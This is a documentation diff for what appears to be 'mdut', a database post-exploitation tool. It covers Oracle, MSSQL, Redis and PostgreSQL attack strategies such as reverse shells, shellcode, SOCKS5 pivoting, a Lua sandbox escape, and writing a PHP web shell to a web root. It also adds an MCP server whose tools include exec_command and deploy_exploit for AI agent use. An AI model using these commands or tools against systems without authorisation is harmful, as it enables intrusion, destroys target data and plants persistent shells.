@@ -269,7 +269,7 @@ Uploads and downloads use 512 KiB raw-byte chunks:
 - Download gets the remote size first and advances by decoded byte count.
 - Zero-byte files are supported.
 - MSSQL chunked transfers require `ChunkedIO`; ordinary directory browsing does not necessarily require CLR.
-- Oracle `--mkdir` is currently unsupported. Unsupported hash operations fail explicitly.
+- Oracle `--mkdir` uses the Java strategy to recursively create missing parent directories. It succeeds idempotently when the directory already exists and fails explicitly if a regular file occupies the path or creation fails. The Scheduler strategy reports it as unsupported; unsupported hash operations also fail explicitly.
 
 Examples:
 
@@ -356,8 +356,8 @@ mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" \
 ### 10.2 MSSQL (Windows Targets Only)
 
 - Strategies degrade from xp_cmdshell to OLE to Agent Job. Agent Job is blind-only.
-- On Windows, the CLR extension adds reverse shell, shellcode, SOCKS5, file management, and chunked I/O.
-- Without CLR, directory browsing may still work through xp_cmdshell/OLE. Trust the reported capabilities.
+- On Windows, the CLR extension adds reverse shell, shellcode, and SOCKS5.
+- File management and chunked I/O do not depend on CLR. Without CLR, built-in strategies can still upload, download, and browse directories according to the reported capabilities.
 - Deployment records the original xp_cmdshell/OLE settings and restores them during cleanup instead of blindly disabling them.
 - MSSQL on Linux is outside the CLI's supported scope.
 
@@ -406,6 +406,8 @@ mdut cli -d "redis://127.0.0.1:6379" \
   --write-precise --src ./shell.php --dst /var/www/html/shell.php
 ```
 
+- When directory probing (`DirProbe`) is available, `--list-dir` works without deploying a Module. Likewise, `--revshell` uses an available Lua sandbox-escape channel without deploying a Module. Other file operations and SOCKS5 still require a Module.
+
 - Uses replication directly, with no Module deployment or cleanup.
 - **Clears the target's in-memory dataset and overwrites the destination file.**
 - Inputs shorter than 9 bytes are padded with newlines to 9 bytes; only inputs at least that long remain byte-exact.
@@ -441,6 +443,31 @@ mdut cli -d "$DSN" --blind --exec "nohup /tmp/worker >/tmp/worker.log 2>&1 &"
 | Cleanup after `--no-cleanup` | Use `--cleanup`, limited to engine-recoverable state |
 | SOCKS5 or Oracle revshell does not exit | Expected persistent behavior; send SIGINT/SIGTERM, not `--timeout` |
 | Unknown architecture | The target INFO lacks a recognizable machine ISA, so CLI refuses to guess a payload platform |
+
+## 13. MCP Server
+
+The MCP server exposes **35 tools**, including the complete file workflow and database-specific execution controls. Build its standalone STDIO entrypoint with:
+
+```bash
+go build -tags mcp -o mdut-mcp ./cmd/mcp
+./mdut-mcp
+```
+
+After `connect` returns a `session_id`, file tools can create, rename, append, chunk-read, size, and hash remote files. `append_file` accepts standard Base64 without changing its encoding; `read_file_chunk` returns Base64 and requires a nonnegative integer `offset` and positive integer `length`:
+
+```json
+{"session_id":"SESSION_ID","path":"/tmp/a.bin","offset":0,"length":4096}
+```
+
+`list_dir` accepts optional `path_charset`; `read_file` and `write_file` accept optional `path_charset` and `content_charset`, all defaulting to UTF-8. PostgreSQL clients can select no-UDF command execution before `exec_command`:
+
+```json
+{"session_id":"SESSION_ID","method":"copy_program"}
+```
+
+Send that request to `set_pg_exec_method`. `start_socks5` additionally accepts optional `user` and `pass` credentials. On Redis sessions, generic `deploy_exploit` uses the same Module deployment path and `module_path`/rogue/relay arguments as `redis_deploy_module`.
+
+See [the MCP guide](mcp-en.md) for the complete tool inventory and examples.
 
 ## Security Notes
 
